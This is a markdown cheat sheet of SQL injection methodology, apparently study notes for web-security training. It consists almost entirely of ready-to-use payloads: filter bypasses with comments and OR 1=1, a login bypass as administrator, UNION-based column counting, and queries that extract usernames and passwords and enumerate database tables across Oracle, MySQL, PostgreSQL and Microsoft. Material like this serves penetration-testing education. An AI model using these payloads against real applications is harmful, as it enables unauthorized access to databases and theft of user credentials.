# Methodology - SQL Injection

##### Retrieving hidden data #1
```
Original query:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

https://insecure-website.com/products?category=Gifts'--

This results in the SQL query:

SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 
```

##### Retrieving hidden data #2
```
Original query:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

https://insecure-website.com/products?category=Gifts'+OR+1=1--

This results in the SQL query:

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
```

##### Subverting application logic
```
SELECT * FROM users WHERE username = $USER AND password = $PASS

If user input is administrator'-- 

SELECT * FROM users WHERE username = 'administrator'--' AND password = '' 
```

##### Determining the number of columns required in an SQL injection UNION attack #1
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

When the specified column index exceeds the number of actual columns in the result set:

The ORDER BY position number 3 is out of range of the number of items in the select list.
```
##### Determining the number of columns required in an SQL injection UNION attack #2
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc. 
```
##### Finding columns with a useful data type in an SQL injection UNION attack
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
```
##### Using an SQL injection UNION attack to retrieve interesting data
```
 ' UNION SELECT username, password FROM users-- 
```

##### String concatenation
```
Oracle 	   'foo'||'bar'
Microsoft  'foo'+'bar'
PostgreSQL 'foo'||'bar'
MySQL 	   'foo' 'bar' [Note the space between the two strings]
           CONCAT('foo','bar')
```
##### Querying the database type and version
```
Database type 	                          Query
Microsoft, MySQL 	                 SELECT @@version
Oracle 	                          SELECT * FROM v$version
PostgreSQL 	                         SELECT version() 
```

##### Listing the contents of the database (Non-Oracle)
```
' UNION SELECT NULL,table_name from information_schema.tables--
' UNION SELECT NULL,column_name from information_schema.columns where table_name='users'--
' UNION SELECT username,password from users--
```

##### Listing the contents of the database (Oracle)
```
 You can list tables by querying all_tables:

SELECT * FROM all_tables

And you can list columns by querying all_tab_columns:

SELECT * FROM all_tab_columns WHERE table_name = 'USERS' 
```
